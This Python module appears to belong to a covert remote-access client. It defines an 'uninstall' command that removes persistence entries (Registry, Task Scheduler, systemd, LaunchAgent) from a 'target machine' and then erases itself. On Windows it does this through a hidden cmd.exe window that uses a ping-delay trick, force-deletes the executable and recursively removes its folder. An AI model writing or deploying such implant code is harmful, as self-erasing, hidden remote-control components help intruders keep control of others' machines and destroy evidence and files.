"""
Command: uninstall
Removes all persistence, kills the process, and deletes the binary.
Admin sends this command → client cleans up everything and exits.
"""
from __future__ import annotations
import asyncio
import logging
import os
import sys
from pathlib import Path

from client.commands.registry import register
from client.persistence import uninstall

log = logging.getLogger(__name__)


@register("uninstall")
async def uninstall_client(payload: dict) -> dict:
    """
    Fully remove the client from the target machine:
    1. Remove persistence (Registry, Task Scheduler, systemd, LaunchAgent)
    2. Schedule self-deletion of the binary
    3. Exit the process
    """
    results = {}

    # Step 1 — remove persistence
    try:
        ok = uninstall()
        results["persistence_removed"] = ok
        log.info("Persistence removed: %s", ok)
    except Exception as exc:
        results["persistence_removed"] = False
        results["persistence_error"] = str(exc)
        log.error("Persistence removal error: %s", exc)

    # Step 2 — schedule binary self-deletion + process exit
    asyncio.create_task(_self_destruct())

    results["status"] = "uninstalling"
    results["message"] = "Client is shutting down and removing itself."
    return results


async def _self_destruct() -> None:
    """Wait briefly so the result can be sent back, then delete and exit."""
    await asyncio.sleep(2)

    exe = Path(sys.executable if getattr(sys, "frozen", False) else sys.argv[0]).resolve()
    log.info("Self-destructing: %s", exe)

    if sys.platform == "win32":
        _windows_self_delete(exe)
    else:
        _unix_self_delete(exe)

    os._exit(0)


def _windows_self_delete(exe: Path) -> None:
    """
    On Windows a running exe cannot be deleted directly.
    Use cmd.exe with a ping-delay trick to delete after process exits.
    """
    import subprocess
    script = (
        f'ping 127.0.0.1 -n 3 > nul & '
        f'del /f /q "{exe}" & '
        f'rd /s /q "{exe.parent}" 2>nul'
    )
    subprocess.Popen(
        ["cmd.exe", "/c", script],
        creationflags=0x08000000,   # CREATE_NO_WINDOW
        close_fds=True,
    )


def _unix_self_delete(exe: Path) -> None:
    """On Unix we can unlink while running."""
    try:
        exe.unlink(missing_ok=True)
    except Exception as exc:
        log.warning("Could not delete binary: %s", exc)
